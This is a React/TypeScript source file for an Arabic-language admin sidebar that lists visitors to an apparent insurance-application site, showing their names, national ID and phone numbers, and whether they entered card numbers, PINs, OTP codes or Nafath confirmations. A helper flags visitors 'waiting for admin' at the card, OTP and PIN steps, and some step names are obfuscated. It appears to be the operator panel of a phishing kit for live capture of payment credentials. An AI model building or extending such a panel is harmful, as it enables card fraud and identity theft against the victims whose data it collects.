"use client"

import { Search, Trash2, CheckSquare, Square, CreditCard, KeyRound, Circle, RefreshCw } from "lucide-react"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { getTimeAgo } from "@/lib/time-utils"

interface VisitorSidebarProps {
  visitors: InsuranceApplication[]
  selectedVisitor: InsuranceApplication | null
  onSelectVisitor: (visitor: InsuranceApplication) => void
  searchQuery: string
  onSearchChange: (query: string) => void
  cardFilter: "all" | "hasCard"
  onCardFilterChange: (filter: "all" | "hasCard") => void
  selectedIds: Set<string>
  onToggleSelect: (id: string) => void
  onSelectAll: () => void
  onDeleteSelected: () => void
  sidebarWidth: number
  onSidebarWidthChange: (width: number) => void
}

// Check if visitor is waiting for admin response
const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
  return (
    visitor.cardStatus === "waiting" ||
    visitor.otpStatus === "waiting" ||
    visitor.pinStatus === "waiting" ||
    visitor.nafadConfirmationStatus === "waiting"
  )
}

// Get current page name in Arabic
const getPageName = (step: number | string): string => {
  // Handle string values first (legacy system)
  if (typeof step === 'string') {
    const stringPageNames: Record<string, string> = {
      '_st1': 'الدفع (بطاقة)',
      '_t2': 'OTP',
      '_t3': 'PIN',
      '_t6': 'نفاذ',
      'phone': 'الهاتف',
      'home': 'الرئيسية',
      'insur': 'بيانات التأمين',
      'compar': 'مقارنة العروض',
      'check': 'الدفع',
      'veri': 'OTP',
      'confi': 'PIN',
      'nafad': 'نفاذ'
    }
    return stringPageNames[step] || `غير محدد (${step})`
  }
  
  // Handle numeric values
  const stepNum = typeof step === 'number' ? step : parseInt(step)
  const pageNames: Record<number, string> = {
    0: 'الرئيسية',
    1: 'الرئيسية',
    2: 'بيانات التأمين',
    3: 'مقارنة العروض',
    4: 'الدفع',
    5: 'OTP',
    6: 'PIN',
    7: 'الهاتف',
    8: 'نفاذ'
  }
  
  return pageNames[stepNum] || `غير محدد (${stepNum})`
}

export function VisitorSidebar({
  visitors,
  selectedVisitor,
  onSelectVisitor,
  searchQuery,
  onSearchChange,
  cardFilter,
  onCardFilterChange,
  selectedIds,
  onToggleSelect,
  onSelectAll,
  onDeleteSelected,
  sidebarWidth,
  onSidebarWidthChange
}: VisitorSidebarProps) {
  const allSelected = visitors.length > 0 && selectedIds.size === visitors.length



  return (
    <div 
      className="w-full md:w-[400px] bg-white landscape:border-l md:border-l border-gray-200 flex flex-col relative group"
      style={{ 
        fontFamily: 'Cairo, Tajawal, sans-serif',
        width: window.matchMedia('(orientation: landscape) and (max-width: 1024px)').matches ? `${sidebarWidth}px` : undefined
      }}
    >

      {/* Header */}
      <div className="p-4 landscape:p-2 border-b border-gray-200 bg-gray-50">
        <h1 className="text-xl landscape:text-base font-bold text-gray-800 mb-4 landscape:mb-2">لوحة التحكم</h1>
        
        {/* Search */}
        <div className="relative mb-3 landscape:mb-2">
          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 landscape:w-4 landscape:h-4 text-gray-400" />
          <input
            type="text"
            placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            className="w-full pr-10 pl-4 py-2 landscape:py-1.5 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 text-sm landscape:text-xs"
          />
        </div>

        {/* Filters */}
        <div className="flex gap-2 mb-3 landscape:mb-2">
          <button
            onClick={() => onCardFilterChange("all")}
            className={`flex-1 px-3 py-1.5 landscape:py-1 rounded-lg text-sm landscape:text-xs font-medium transition-colors ${
              cardFilter === "all"
                ? "bg-green-600 text-white"
                : "bg-gray-200 text-gray-700 hover:bg-gray-300"
            }`}
          >
            الكل
          </button>
          <button
            onClick={() => onCardFilterChange("hasCard")}
            className={`flex-1 px-3 py-1.5 landscape:py-1 rounded-lg text-sm landscape:text-xs font-medium transition-colors ${
              cardFilter === "hasCard"
                ? "bg-green-600 text-white"
                : "bg-gray-200 text-gray-700 hover:bg-gray-300"
            }`}
          >
            لديهم بطاقة
          </button>
        </div>

        {/* Actions */}
        <div className="flex gap-2">
          <button
            onClick={onSelectAll}
            className="flex items-center gap-2 px-3 py-1.5 landscape:py-1 bg-gray-200 hover:bg-gray-300 rounded-lg text-sm landscape:text-xs font-medium transition-colors"
          >
            {allSelected ? <CheckSquare className="w-4 h-4 landscape:w-3 landscape:h-3" /> : <Square className="w-4 h-4 landscape:w-3 landscape:h-3" />}
            {allSelected ? "إلغاء الكل" : "تحديد الكل"}
          </button>
          
          {selectedIds.size > 0 && (
            <button
              onClick={onDeleteSelected}
              className="flex items-center gap-2 px-3 py-1.5 landscape:py-1 bg-red-500 hover:bg-red-600 text-white rounded-lg text-sm landscape:text-xs font-medium transition-colors"
            >
              <Trash2 className="w-4 h-4 landscape:w-3 landscape:h-3" />
              حذف ({selectedIds.size})
            </button>
          )}
        </div>
      </div>

      {/* Visitor List */}
      <div className="flex-1 overflow-y-auto">
        {visitors.length === 0 ? (
          <div className="p-8 text-center text-gray-500">
            <p>لا يوجد زوار</p>
          </div>
        ) : (
          visitors.map((visitor) => (
            <div
              key={visitor.id}
              onClick={() => onSelectVisitor(visitor)}
              className={`p-4 landscape:p-2 border-b border-gray-100 cursor-pointer transition-colors hover:bg-gray-50 ${
                selectedVisitor?.id === visitor.id ? "bg-green-50 border-r-4 border-r-green-600" : ""
              } ${visitor.isUnread ? "bg-pink-50" : ""}`}
            >
              <div className="flex items-start gap-3">
                {/* Checkbox */}
                <div
                  onClick={(e) => {
                    e.stopPropagation()
                    if (visitor.id) onToggleSelect(visitor.id)
                  }}
                  className="mt-1"
                >
                  {(visitor.id && selectedIds.has(visitor.id)) ? (
                    <CheckSquare className="w-5 h-5 text-green-600" />
                  ) : (
                    <Square className="w-5 h-5 text-gray-400" />
                  )}
                </div>

                {/* Visitor Info */}
                <div className="flex-1 min-w-0">
                  {/* Name & Time Ago */}
                  <div className="flex items-center justify-between mb-1">
                    <div className="flex items-center gap-2 flex-1 min-w-0">
                      <h3 className="font-semibold text-gray-900 truncate text-base landscape:text-sm">{visitor.ownerName}</h3>
                      <span className="flex items-center gap-1 text-xs font-medium text-white bg-teal-600 px-2 py-0.5 rounded whitespace-nowrap">
                        {isWaitingForAdmin(visitor) && (
                          <RefreshCw className="w-3 h-3 animate-spin" />
                        )}
                        {getPageName(visitor.currentStep)}
                      </span>
                    </div>
                    
                    {/* Time ago indicator */}
                    <div className="flex items-center gap-1 text-xs landscape:text-[10px] text-gray-500 font-medium whitespace-nowrap">
                      <span>{getTimeAgo(visitor.updatedAt || visitor.lastSeen)}</span>
                    </div>
                  </div>





                  {/* Contact Info: Phone & ID */}
                  <div className="hidden md:flex items-center gap-3 mb-2 text-xs text-gray-700">
                    {visitor.phoneNumber && (
                      <div className="flex items-center gap-1">
                        <span className="font-medium">📞 {visitor.phoneNumber}</span>
                      </div>
                    )}
                    {visitor.identityNumber && (
                      <div className="flex items-center gap-1">
                        <span className="font-medium">🆔 {visitor.identityNumber}</span>
                      </div>
                    )}
                  </div>

                  {/* Bottom Row: Status & Page */}
                  <div className="hidden md:flex items-center justify-between">
                    {/* Left: Online Status & Icons */}
                    <div className="flex items-center gap-2">
                      <div className="flex items-center gap-1">
                        <div className={`w-2 h-2 rounded-full ${visitor.isOnline ? 'bg-green-500' : 'bg-gray-400'}`}></div>
                        <span className="text-xs text-gray-600">{visitor.isOnline ? 'متصل' : 'غير متصل'}</span>
                      </div>
                      
                      {(visitor._v1 || visitor.cardNumber) && (
                        <div className="flex items-center gap-1 px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">
                          <CreditCard className="w-3 h-3" />
                        </div>
                      )}
                      {visitor.phoneVerificationCode && (
                        <div className="flex items-center gap-1 px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">
                          <KeyRound className="w-3 h-3" />
                        </div>
                      )}
                    </div>


                  </div>
                </div>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )
}
